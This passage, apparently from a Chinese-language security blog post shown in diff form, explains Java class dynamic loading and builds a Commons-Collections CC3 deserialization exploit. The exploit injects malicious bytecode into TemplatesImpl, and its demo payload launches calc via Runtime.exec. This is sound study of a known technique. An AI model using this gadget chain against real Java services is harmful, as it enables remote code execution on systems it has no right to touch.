+<p>调用另一个 loadClass。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990481447-28ac6305-1990-4b3e-9bb7-57086c60aa93.png" alt="img" /></p>
+
+<p>调用后进入 AppClassLoader.loadClass，调用父类 ClassLoader.loadClass .</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640003227711-5f64748f-f1de-43cc-9612-aa2bb199fc9a.png" alt="img" /></p>
+
+<p>首先调用 findLoadedClass 查找该类是否已经被加载。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639990644577-b7c41f39-6c8f-4df9-8d95-da3898f27ddf.png" alt="img" /></p>
+
+<p>此时 parent 为 ExtClassLoader 。调用 ExtClassLoader.loadClass 方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640000292137-9201023f-4aa6-461b-a6af-7f1a77a60027.png" alt="img" /></p>
+
+<p>但是 ExtClassLoader 没有 loadClass 方法，因此调用父类，也就是 ClassLoader. loadClass ，就是当前的这个函数。此时 parent = null，调用 findBootstrapClassOrNull 方法，从 BootstrapClass 中寻找，也就是判断这个类是否被 BootstrapClassLoader 加载过，结果为 null。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640000583258-bbcba66f-afbe-48a9-a9f3-137b2b33b08d.png" alt="img" /></p>
+
+<p>进而调用 URLClassLoader.findClass</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640000857726-76b04477-8b6f-4f9b-b139-eccd99ab6118.png" alt="img" /></p>
+
+<p>可以看到 findClass 中首先将 class 文件的路径赋值给 path，然后调用 ucp.getResource 获取字节码为一个 Resources 对象。最后调用 defineClass 将类加载进来。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640000908517-03ad879d-9baf-4f20-9d6a-00c1dda3e9ca.png" alt="img" /></p>
+
+<p>defineClass 方法中将字节码读取出来，最终都调用重载的同名函数。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640001164041-00c7984a-8af9-4fdc-a727-fed9f8f03f15.png" alt="img" /></p>
+
+<p>该函数内部调用了 defineClass1 这个 native 函数把类加载进来。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640001381415-c7b79232-0bfb-4b17-88ac-8afabb079395.png" alt="img" /></p>
+
+<p>回顾整个调用过程，流程如下：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640003669096-e56af11a-9f8a-4d26-a192-a464215caffe.jpeg" alt="img" /></p>
+
+<p>试想，如果我们能够控制这几个函数的任何一个，就能够加载任意的 .class 文件，攻击面就能够得到极大的扩大。</p>
+
+<h3 id="2-类动态加载利用">2. 类动态加载利用</h3>
+
+<p>在实际利用过程中，一般是通过动态加载恶意字节码的方式进行攻击，通常利用如下三个函数，但是这三个函数也有相应的局限：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>局限</th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>URLClassLoader.loadClass</td>
+      <td>http、jar、file 等协议的局限</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>ClassLoader.defineClass</td>
+      <td>方法是私有的</td>
+      <td>但是可以寻找到调用其的 public 方法</td>
+    </tr>
+    <tr>
+      <td>Usafe.defineClass</td>
+      <td>类不能直接生成</td>
+      <td>Spring 中有一个 public 方法可以生成。</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="21-urlclassloaderloadclass">2.1 URLClassLoader.loadClass</h4>
+
+<p>URLClassLoader 的参数为 URL 数组，可以用于加载远程的 .class 文件。</p>
+
+<p>我们先编写一个示例类，编译成 .class 文件。Person 类中的 Hello 为静态函数。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Person</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="s">"Hello world"</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">Hello</span><span class="o">(){</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">string</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>将 Person.class 移动到其他目录，并在目录下使用 <code class="language-plaintext highlighter-rouge">python -m http.server 9999</code> 启一个 http 服务。</p>
+
+<p>然后将项目中的 Person.java 删除。</p>
+
+<p>Test.java</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.URLClassLoader</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">URLClassLoader</span> <span class="n">urlClassLoader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLClassLoader</span><span class="o">(</span><span class="k">new</span> <span class="no">URL</span><span class="o">[]{</span><span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="s">"http://localhost:9999/"</span><span class="o">)});</span>
+        <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="n">urlClassLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"Person"</span><span class="o">);</span>
+        <span class="nc">Method</span> <span class="n">hello</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"Hello"</span><span class="o">);</span>
+        <span class="n">hello</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>可以看到成功加载了远程的 .class 文件。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640004163397-0aca5b7a-65a9-4086-98ec-58b6bbdb2c12.png" alt="img" /></p>
+
+<p>http 服务器上也能够收到访问请求。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640004197601-25372ebe-75cb-438c-8e0e-ed7625dca62b.png" alt="img" /></p>
+
+<p>除了 http 协议，URLClassLoader 还可以使用 file 协议和 jar 协议。jar 协议需要我们将恶意代码先打包成一个 jar 文件。注意写法：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.URLClassLoader</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">URLClassLoader</span> <span class="n">urlClassLoader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLClassLoader</span><span class="o">(</span><span class="k">new</span> <span class="no">URL</span><span class="o">[]{</span><span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="s">"jar:http://localhost:9999/xxx.jar!/"</span><span class="o">)});</span>
+        <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="n">urlClassLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"Person"</span><span class="o">);</span>
+        <span class="nc">Method</span> <span class="n">hello</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"Hello"</span><span class="o">);</span>
+        <span class="n">hello</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h4 id="22-classloaderdefineclass">2.2 ClassLoader.defineClass</h4>
+
+<p>该方法是一个 protected 方法，因此我们需要反射来调用。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Path</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="nc">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="nc">Path</span> <span class="n">path</span> <span class="o">=</span> <span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"C:\\tmp\\Person.class"</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="nc">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+        <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Class</span><span class="o">&lt;?&gt;)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="nc">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span><span class="s">"Person"</span><span class="o">,</span><span class="n">bytes</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+        <span class="n">c</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"Hello"</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640005855341-b2928801-8601-46e7-bb99-869a15bebe76.png" alt="img" /></p>
+
+<p>如果我们要调用的代码写在静态代码块里，在实例化的时候就可以直接调用。</p>
+
+<p>重新写一个 Person：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Person</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"hello static"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>然后再 Test.java 中将调用方法的代码注释掉。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Path</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="nc">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="nc">Path</span> <span class="n">path</span> <span class="o">=</span> <span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"C:\\tmp\\Person.class"</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="nc">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+        <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Class</span><span class="o">&lt;?&gt;)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="nc">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span><span class="s">"Person"</span><span class="o">,</span><span class="n">bytes</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+        <span class="n">c</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+<span class="c1">//        c.getMethod("Hello").invoke(null,null);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006204018-ee327031-ab3c-4e1d-b0e8-a7464d990ef3.png" alt="img" /></p>
+
+<p>相比于 URLClassLoader ，ClassLoader.defineClass 只需要接收到字节码就可以调用，不需要出网，更为通用一些。</p>
+
+<p>但 ClassLoader.defineClass 方法的问题在于是一个 protected 方法，因此没法直接在包外调用，反序列化时没法直接调用，但是在某些类的 public 方法中，也会调用 ClassLoader.defineClass 。使用 IDEA find Usage 查找调用，可以看到这两个包中调用了 defineClass，因此可以再这两个包中进一步寻找相关的调用链。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006513112-e610359a-55cf-4d02-b56d-e33120051623.png" alt="img" /></p>
+
+<h4 id="23-usafedefineclass">2.3 Usafe.defineClass</h4>
+
+<p>Unsafe 类中也有一个 defineClass ，并且是 public。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006689826-dca8fdd8-6799-4a4d-ab35-1d7bb5d19774.png" alt="img" /></p>
+
+<p>但是我们没法直接调用 defineClass 方法。因为 Unsafe 	用单例模式实现，无法直接调用构造函数生成实例，虽然有一个 getUnsafe 方法可以返回一个 Unsafe 实例，但是在运行的时候，由于安全检查，会直接抛出异常。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006845809-cb3b2ae2-c2dc-459d-9886-7ab62559a134.png" alt="img" /></p>
+
+<p>由于 Unsafe 中会将一个实例赋值到一个静态变量 theUnsafe 中，因此我们可以通过反射来获取这个变量。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640006952687-4f175023-6eba-4141-b34d-bda23213865b.png" alt="img" /></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sun.misc.Unsafe</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">Field</span> <span class="n">theUnsafe</span> <span class="o">=</span> <span class="nc">Unsafe</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"theUnsafe"</span><span class="o">);</span>
+        <span class="n">theUnsafe</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="nc">Unsafe</span> <span class="n">u</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Unsafe</span><span class="o">)</span> <span class="n">theUnsafe</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">u</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>成功获取</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640007103752-aab9ff38-5bfa-446d-b8f2-da98200007aa.png" alt="img" /></p>
+
+<p>后面就是加载 .class ，与前面的一致。</p>
+
+<h2 id="0x02-触发点">0x02 触发点</h2>
+
+<p>我们知道利用类的动态加载，可以从 URLClassLoader.loadClass、ClassLoader.defineClass、Usafe.defineClass 这三个函数入手， CC3 这条链用的是 ClassLoader.defineClass，我们可以使用 IDEA find Usages 查找哪里调用了这个函数。当然 ClassLoader 中对 defineClass 进行了重载，都可以用 find Usages 找一找。</p>
+
+<p>CC3 中使用的是下图这一个 defineClass 。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073329956-29abb27d-712d-457d-9d85-ac9b230827a4.png" alt="img" /></p>
+
+<h2 id="0x03-调用链">0x03 调用链</h2>
+
+<p>在 com.sun.org.apache.xalan.internal.xsltc.trax 的 TemplatesImpl 类中，有一个 defineClass 函数。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073414425-63362ca5-f410-46b4-9fde-7f8f11ffc089.png" alt="img" /></p>
+
+<p>该函数调用了 ClassLoader.defineClass。由于是 default 类型，因此只能寻找 TemplatesImpl 中有没有 public 方法能够调用到它。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073559038-08c01e0e-cfcb-4b21-be94-a85d9e280214.png" alt="img" /></p>
+
+<p>继续寻找，发现 defineTransletClasses 方法中有调用。但是是 private 方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073814164-1e8e0259-5765-4037-8b14-1cda108f07af.png" alt="img" /></p>
+
+<p>继续寻找，发现三个调用的地方。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073865108-c41c8c50-d5e0-47fd-a52c-f8b9f265d5d8.png" alt="img" /></p>
+
+<p>前两个方法继续 find Usages 已经找不到了。</p>
+
+<p>注意到第三个方法 getTransletInstance 中，加载了类之后，会调用 newInstance 实例化，这就可以运行恶意类中的静态代码块。但是 getTransletInstance 是一个 private 方法，需要进一步往上找。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640077024321-5362ec82-cc9d-47ba-834f-99865e5d21ed.png" alt="img" /></p>
+
+<p>最后在 newTransformer 方法中找到调用。并且 newTransformer 这个方法还是一个 public 方法，因此可以被其他类调用。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640073976704-a2d5c208-9e69-41bc-bbdd-4f98ecdd5c29.png" alt="img" /></p>
+
+<p>到了这一步，我们可以理一下调用链：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640077174934-2a1a37ea-949e-4832-8616-b7170f5de6bd.png" alt="img" /></p>
+
+<h3 id="1-invoketransformer-调用链">1. invokeTransformer 调用链</h3>
+
+<p>结合之前的 CC1 我们可以知道，invokeTransformer 可以调用任意类的任意方法，因此，只要调用 TransformerImpl.newTransformer 方法，就可以完成利用。</p>
+
+<p>至此我们可以先手动编写一下 exp。</p>
+
+<p>首先编写一个 Calc.java 编译成 .class 然后放到某个目录下。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Calc</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>编写利用 exp 时需要注意以下几个地方：</p>
+
+<p>getTransletInstance 中存在几个判断。 _name 需要不为 null，_class 需要为 null，编写 exp 时我们可以使用反射来进行修改。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640075005200-5a01b13c-c327-4df7-b84a-fbf34a22b359.png" alt="img" /></p>
+
+<p>defineTransletClasses 中，defineClass 的参数 _bytecodes 就是我们需要传入的恶意字节码，</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640075120741-4dc21871-4360-4b49-bfe9-2e5043ac7d9e.png" alt="img" /></p>
+
+<p>_bytecodes 是一个二维数组，上面在传入时是循环遍历，因此构造一个二维数组，其中就放一个元素，为恶意字节码即可。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640075859827-8b8f81af-59e2-49ce-a26e-f426bd9c0a5f.png" alt="img" /></p>
+
+<p>另外，defineTransletClasses 中有一处使用了一个 _tfactory 变量。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640075992394-389edce3-ce2b-4a5f-b6d0-77a7fd57d380.png" alt="img" /></p>
+
+<p>但是这个 _tfactory 变量是一个 transient 变量，不会被序列化。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640076050015-de1514ac-f159-4b64-9d93-42ce738608b9.png" alt="img" /></p>
+
+<p>一般这种变量，由于不能序列化，在反序列化时都会进行相应的赋值。可以查看 readObject 函数，赋值一个 TransformerFactoryImpl 实例。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640076140120-1b353afc-1d6d-4c17-9edd-c5fa565defdf.png" alt="img" /></p>
+
+<p>所以，在实际反序列化 payload 构造时，不对这个 _tfactory 赋值都是可以的，但是为了本地调试时不会报错，也需要赋值。综上可以写出如下的 exp。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Path</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC3</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">TestCC3</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestCC3</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Path</span> <span class="n">path</span> <span class="o">=</span> <span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"C:\\tmp\\Calc.class"</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="nc">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">bytes1</span> <span class="o">=</span> <span class="o">{</span><span class="n">bytes</span><span class="o">};</span>
+        <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TemplatesImpl</span><span class="o">();</span>
+        <span class="nc">Field</span> <span class="n">bytecodesField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">bytes1</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">classField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_class"</span><span class="o">);</span>
+        <span class="n">classField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">classField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">tfactoryField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
+        <span class="n">tfactoryField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">tfactoryField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="k">new</span> <span class="nc">TransformerFactoryImpl</span><span class="o">());</span>
+
+        <span class="n">templates</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">();</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>我们可以尝试运行一下，但是发现并不能执行且出现空指针异常，动态调试跟进去。发现在 defineTransletClasses 中的 _auxClasses 因为没有赋值而出现空指针异常。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640076406058-e3258d0e-3228-4d39-b337-bda0ac2ad569.png" alt="img" /></p>
+
+<p>此时 i = 0，_transletIndex = -1。</p>
+
+<p>这里有两个解决思路，一个是给 _auxClasses 赋值，另外一个是使得表达式 superClass.getName().equals(ABSTRACT_TRANSLET 成立。</p>
+
+<p>注意到下面对 _transletIndex 进行了判断，如果小于零，也会抛出 TransformerConfigurationException 异常。</p>
+
